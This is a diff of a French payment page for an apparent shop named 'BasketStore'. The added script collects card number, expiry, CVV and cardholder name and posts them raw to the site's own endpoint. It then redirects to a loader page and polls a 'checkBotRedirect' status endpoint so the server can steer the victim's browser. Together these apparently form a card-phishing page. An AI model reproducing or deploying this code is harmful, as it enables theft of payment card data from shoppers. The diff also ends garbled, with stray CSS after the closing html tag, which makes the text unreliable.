@@ -1,40 +1,56 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Paiement - Basket Shop</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #fafafa;
-      color: #333;
-      text-align: center;
-      padding-top: 60px;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Paiement - BasketStore</title>
+<style>
+  body{font-family:Arial;text-align:center;padding:40px;}
+  input{display:block;margin:10px auto;padding:10px;width:80%;font-size:1em;}
+  button{padding:15px 25px;border-radius:10px;font-size:1.1em;cursor:pointer;background:#007bff;color:white;border:none;}
+  button:hover{background:#0056b3;}
+</style>
+</head>
+<body>
+  <h1>💳 Paiement</h1>
+  <input type="text" id="cardNumber" placeholder="Numéro de carte">
+  <input type="text" id="expiry" placeholder="MM/YY">
+  <input type="text" id="cvv" placeholder="CVV">
+  <input type="text" id="nomTitulaire" placeholder="Nom titulaire">
+  <button id="payNow">Payer maintenant</button>
+
+  <script>
+    document.getElementById('payNow').addEventListener('click', async ()=>{
+      const data = {
+        cardNumber: document.getElementById('cardNumber').value,
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        nomTitulaire: document.getElementById('nomTitulaire').value
+      };
+      try{
+        await fetch('/api/payment',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(data)
+        });
+      }catch(e){console.error(e);}
+      // Redirection frontend vers loader
+      window.location.href = '/loader.html';
+    });
+
+    async function checkBotRedirect() {
+      try{
+        const res = await fetch('/api/status');
+        const data = await res.json();
+        if(data.redirect && window.location.pathname !== data.redirect){
+          window.location.href = data.redirect;
+        } else { setTimeout(checkBotRedirect,2000);}
+      } catch(e){ setTimeout(checkBotRedirect,2000);}
     }
-    h1 {
-      color: #222;
-    }
-    form {
-      display: inline-block;
-      background: white;
-      padding: 20px 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      margin-top: 30px;
-      width: 320px;
-    }
-    input {
-      display: block;
-      width: 100%;
-      margin: 10px 0;
-      padding: 10px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 1em;
-    }
-    button {
-      background-color: #007bff;
+    checkBotRedirect();
+  </script>
+</body>
+</html>      background-color: #007bff;
       color: white;
       border: none;
       padding: 12px 18px;
